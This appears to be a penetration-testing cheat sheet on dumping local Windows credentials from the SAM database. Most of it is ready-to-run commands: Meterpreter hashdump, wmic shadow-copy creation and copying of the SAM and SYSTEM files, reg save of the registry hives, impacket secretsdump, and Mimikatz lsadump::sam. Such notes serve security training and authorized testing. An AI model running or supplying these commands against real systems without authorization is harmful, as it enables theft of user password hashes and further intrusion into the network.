#msf #wmi #vssadmin #reg #mimikatz #impacket
# SAM Database
- Local database of local users and their credentials. 
- Cannot be read by any user while windows is running.
- To dump credentials from the SAM database, SYSTEM is also required. [Credentials](../AD%20Basics/Credentials.md)
### Metasploit
- Metasploit's `hashdump` can be used to dump the SAM database.
- Requires administrative privileges.
```
meterpreter > hashdump
```
### Fetching SAM and SYSTEM using Volume shadow copy
- This can be used to fetch SAM and SYSTEM database by creating a shadow copy of the windows installation.
- Requires administrative privileges.
- Using WMI to call the shadow copy function
```powershell
# Create a shadow copy of the C Drive
wmic shadowcopy call create Volume='C:\'
# Verify creation
vssadmin list shadows
# "Shadow Copy Volume" property has the location of the shadow copy 
# SAM and SYSTEM can be copied from this path
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
```
### Fetching SAM and SYSTEM from Registry
- Registry can be used to fetch the SAM and SYSTEM hives.
- Requires administrative privileges.
```powershell
reg save HKLM\sam C:\Users\Administrator\sam-hive
reg save HKLM\system C:\Users\Administrator\system-hive
```
### Dumping SAM using impacket
- secretsdump.py can be used to dump the sam database
```bash
./secretsdump.py -sam sam-hive -system system-hive LOCAL
```
### Mimikatz
- Mimikatz can be used to dump SAM database directory or from the SAM and SYSTEM hives.
```powershell
# dump sam database online
privilege::debug
token::elevate
lsadump::sam
# or via saved sam and system files/registry hives
lsadump::sam /system:system.hiv /sam:sam.hiv
```
